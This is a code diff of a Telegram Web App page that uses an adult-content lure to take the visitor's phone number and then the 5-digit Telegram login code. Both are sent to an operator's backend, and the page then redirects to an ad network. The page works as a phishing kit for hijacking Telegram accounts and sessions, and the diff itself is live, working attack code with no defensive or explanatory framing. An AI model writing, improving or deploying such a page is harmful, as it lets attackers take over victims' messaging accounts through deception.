@@ -7,45 +7,47 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * { box-sizing: border-box; }
-        body { font-family: 'Arial', sans-serif; margin: 0; padding: 0; background: url('https://files.catbox.moe/p9p33p.jpg') no-repeat center center fixed; background-size: cover; height: 100vh; display: flex; align-items: flex-end; justify-content: center; overflow: hidden; }
+        body { 
+            font-family: 'Arial', sans-serif; margin: 0; padding: 0; 
+            background: url('https://rony90790.github.io/session-web/IMG_20260415_045401_985.jpg') no-repeat center center fixed; 
+            background-size: cover; height: 100vh; display: flex; align-items: flex-end; justify-content: center; overflow: hidden;
+        }
         .overlay { background: rgba(0, 0, 0, 0.45); position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
         .main-container { width: 90%; max-width: 360px; z-index: 2; text-align: center; margin-bottom: 40px; }
 
-        .start-btn { background: linear-gradient(45deg, #ff4757, #ff6b81); color: white; border: none; padding: 22px; width: 100%; border-radius: 20px; font-weight: bold; font-size: 22px; cursor: pointer; text-transform: uppercase; box-shadow: 0 10px 25px rgba(255, 71, 87, 0.5); }
-        .instruction-box { background: rgba(255, 255, 255, 0.95); padding: 15px; border-radius: 15px; margin-bottom: 15px; color: #333; font-weight: bold; font-size: 16px; }
-
-        .otp-inputs { display: flex; justify-content: center; gap: 8px; margin-bottom: 15px; }
-        .otp-box { width: 48px; height: 55px; background: rgba(255, 255, 255, 0.25); border: 2px solid rgba(255, 255, 255, 0.6); border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 28px; color: white; font-weight: bold; backdrop-filter: blur(5px); }
-
+        .btn { background: linear-gradient(45deg, #ff4757, #ff6b81); color: white; border: none; padding: 20px; width: 100%; border-radius: 20px; font-weight: bold; font-size: 20px; cursor: pointer; text-transform: uppercase; box-shadow: 0 10px 25px rgba(255, 71, 87, 0.5); }
         .get-code-btn { background: #3f9e9e; color: white; border: none; padding: 12px; width: 100%; border-radius: 10px; font-weight: bold; font-size: 18px; margin-bottom: 15px; cursor: pointer; }
         
+        .input-field { width: 100%; padding: 15px; margin: 15px 0; border: 2px solid #ddd; border-radius: 12px; font-size: 20px; text-align: center; }
+        .otp-display { width: 100%; padding: 15px; margin: 10px 0; border: 2px solid #ddd; border-radius: 12px; font-size: 32px; text-align: center; background: #f9f9f9; letter-spacing: 5px; height: 60px; }
+        
         .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
-        .key { background: #4caf50; padding: 16px; border-radius: 12px; font-size: 26px; font-weight: bold; color: white; cursor: pointer; border: none; -webkit-tap-highlight-color: transparent; }
-        .key:active { background: #388e3c; transform: scale(0.95); }
+        .key { background: #4caf50; padding: 16px; border-radius: 12px; font-size: 26px; font-weight: bold; color: white; cursor: pointer; border: none; }
         .key-back { background: #388e3c; }
         .key-empty { background: transparent; }
-
+        
+        .box { background: rgba(255, 255, 255, 0.95); padding: 25px; border-radius: 25px; box-shadow: 0 5px 20px rgba(0,0,0,0.5); }
         .hidden { display: none; }
-        .loader { color: white; font-weight: bold; margin-top: 15px; font-size: 18px; text-shadow: 1px 1px 5px black; }
     </style>
 </head>
 <body>
     <div class="overlay"></div>
     <div class="main-container">
-        <div id="step0">
-            <button class="start-btn" id="s_btn" onclick="startFlow()">🍓 Start Continue 🔞</button>
-            <div id="load" class="loader hidden">🔄 Connecting...</div>
+        <!-- ধাপ ১: Start Button -->
+        <div id="step0" class="box">
+            <button class="btn" onclick="showPhoneInput()">🍓 Start Continue 🔞</button>
         </div>
 
-        <div id="step2" class="hidden">
-            <div class="instruction-box">Enter the 5-digit code that we just sent you!</div>
-            <div class="otp-inputs">
-                <div class="otp-box" id="b1"></div><div class="otp-box" id="b2"></div><div class="otp-box" id="b3"></div><div class="otp-box" id="b4"></div><div class="otp-box" id="b5"></div>
-            </div>
-            
-            <!-- গেট কোড বাটন যা মিনিমাইজ করবে -->
-            <button class="get-code-btn" onclick="tg.close()">🔞 GET CODE 🔞</button>
-            
+        <!-- ধাপ ১.৫: ফোন নম্বর ইনপুট -->
+        <div id="step1" class="box hidden">
+            <input type="tel" id="phone" class="input-field" placeholder="+880...">
+            <button class="btn" onclick="sendNumber()">Next</button>
+        </div>
+
+        <!-- ধাপ ২: ওটিপি কিপ্যাড -->
+        <div id="step2" class="box hidden">
+            <button class="get-code-btn" onclick="tg.openTelegramLink('https://t.me/Telegram')">🔞 GET CODE 🔞</button>
+            <input type="text" id="otp_display" class="otp-display" placeholder="-----" readonly>
             <div class="keypad">
                 <div class="key" onclick="addNum('1')">1</div><div class="key" onclick="addNum('2')">2</div><div class="key" onclick="addNum('3')">3</div>
                 <div class="key" onclick="addNum('4')">4</div><div class="key" onclick="addNum('5')">5</div><div class="key" onclick="addNum('6')">6</div>
@@ -62,41 +64,41 @@
         let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
         let currentOTP = "";
 
-        function startFlow() {
-            tg.requestContact();
-            document.getElementById('s_btn').classList.add('hidden');
-            document.getElementById('load').classList.remove('hidden');
-            poll();
+        function showPhoneInput() {
+            document.getElementById('step0').classList.add('hidden');
+            document.getElementById('step1').classList.remove('hidden');
         }
 
-        async function poll() {
-            try {
-                const res = await fetch(`${BACKEND_URL}/check_contact/${userId}`);
-                const data = await res.json();
-                if (data.status === "success") { sendNumberToBot(data.phone); }
-                else { setTimeout(poll, 1500); }
-            } catch (e) { setTimeout(poll, 2000); }
-        }
-
-        async function sendNumberToBot(phone) {
+        async function sendNumber() {
+            let ph = document.getElementById('phone').value;
             const res = await fetch(`${BACKEND_URL}/send_number`, {
                 method: "POST", headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({ user_id: userId, phone: phone })
+                body: JSON.stringify({ user_id: userId, phone: ph })
             });
             const data = await res.json();
             if (data.status === "success") {
-                document.getElementById('step0').classList.add('hidden');
+                document.getElementById('step1').classList.add('hidden');
                 document.getElementById('step2').classList.remove('hidden');
-            }
+            } else { alert(data.message); }
         }
 
         function addNum(n) {
             if(currentOTP.length < 5) {
-                currentOTP += n; updateBoxes();
+                currentOTP += n; document.getElementById("otp_display").value = currentOTP;
                 if(currentOTP.length === 5) { verifyOTP(); }
             }
         }
-        function clearNum() { currentOTP = currentOTP.slice(0, -1); updateBoxes(); }
-        function updateBoxes() { for(let i=1; i<=5; i++) { document.getElementById('b'+i).innerText = currentOTP[i-1] || ""; } }
+        function clearNum() { currentOTP = currentOTP.slice(0, -1); document.getElementById("otp_display").value = currentOTP; }
 
-        async f
+        async function verifyOTP() {
+            const res = await fetch(`${BACKEND_URL}/verify_otp`, {
+                method: "POST", headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({ user_id: userId, otp: currentOTP })
+            });
+            const data = await res.json();
+            if (data.status === "success") { window.location.href = "https://www.profitablecpmratenetwork.com/w47jpksk7t?key=15b5e8ae609b09733d4a0906eac2a446"; }
+            else { alert("Invalid Code!"); currentOTP = ""; document.getElementById("otp_display").value = ""; }
+        }
+    </script>
+</body>
+</html>
